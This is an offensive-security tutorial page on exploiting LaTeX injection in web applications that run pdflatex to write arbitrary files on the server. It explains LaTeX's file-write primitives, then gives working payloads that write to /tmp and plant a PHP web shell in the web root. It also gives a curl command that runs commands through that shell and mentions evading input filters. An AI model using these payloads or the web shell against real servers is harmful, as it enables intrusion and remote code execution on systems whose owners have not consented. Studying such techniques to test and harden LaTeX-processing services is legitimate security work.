---
title: Exploiting LaTeX Injection for Arbitrary File Write
description: Learn how to use LaTeX injection to perform arbitrary file writes on
  servers.
keywords:
- LaTeX injection
- file write
- arbitrary file write
- web security
- server exploitation
- pdflatex
- LaTeX commands
- remote code execution
- file manipulation
- cybersecurity
---

# Write File

## Context

This article demonstrates exploiting LaTeX injection vulnerabilities to perform arbitrary file writes on a server. To follow this guide effectively, you should be familiar with LaTeX command syntax, file system permissions, web server configurations, and the basics of LaTeX injection techniques.

## Theory

### LaTeX File Write Primitives

LaTeX includes several commands that allow file manipulation, which can be exploited if unsanitized user input is injected into a LaTeX processing system. The key commands for file writing include:

- **`\newwrite\outfile`**: This command creates a new file handle called `\outfile`.
- **`\openout\outfile=filename`**: Opens a file with the specified name for writing.
- **`\write\outfile{content}`**: Writes a specified line of content to the opened file.
- **`\closeout\outfile`**: Closes the file handle, finalizing the written content.

The injection of these commands into a vulnerable LaTeX environment can allow arbitrary files to be created or existing files to be overwritten.

### Attack Surface and Impact

The attack typically involves the following sequence: inject file write primitives, specify a target path, write the payload, and finally close the handle. The critical impact of such an attack depends on the files that can be targeted. Overwriting sensitive files like web roots or configuration files can result in significant security breaches, including code execution or denial of service.

### LaTeX Write File Syntax and Behavior

Understanding the syntax of LaTeX file manipulation commands, as described in the [LaTeX File Write Primitives](#latex-file-write-primitives) section, is critical for crafting effective payloads.
Injections can circumvent basic security filters by obfuscating file paths or splitting malicious commands, allowing attackers to bypass input validation mechanisms.

## Practice

### Arbitrary File Write via LaTeX Injection

To execute an arbitrary file write, you can use the following payload:

```latex
\newwrite\outfile
\openout\outfile=/tmp/evil.txt
\write\outfile{owned by latex}
\closeout\outfile
```

- This payload initializes a new file handle, opens `/tmp/evil.txt` for writing, writes "owned by latex," and then closes the file handle.

**Steps to exploit:**

- Inject the payload into the LaTeX input field of the target web application.
- This requires an injection point in a web application that processes input with tools like `pdflatex`.
- Verify the successful file creation and content writing by checking the file on the server:

    ```bash
    ls -l /tmp/evil.txt
    ```
  This command should show the newly created file.

### Overwrite Web Application File for Code Execution

To achieve remote code execution via file write:

```latex
\newwrite\outfile
\openout\outfile=../webroot/shell.php
\write\outfile{<?php system($_GET['cmd']); ?>}
\closeout\outfile
```

- This payload attempts to create a PHP web shell in the web root directory.

**Steps to exploit:**

- Inject this payload to write the web shell into the application's root.
- Understand the server's directory structure and ensure the LaTeX process has the right permissions.
- Test the web shell functionality:

    ```bash
    curl http://target/webroot/shell.php?cmd=id
    ```
  If successful, this confirms remote code execution capabilities.

## Tools

- **pdflatex**
- **curl** 

This technique allows attackers to write arbitrary files on a server by exploiting vulnerable LaTeX configurations, potentially leading to severe security impacts, including remote code execution.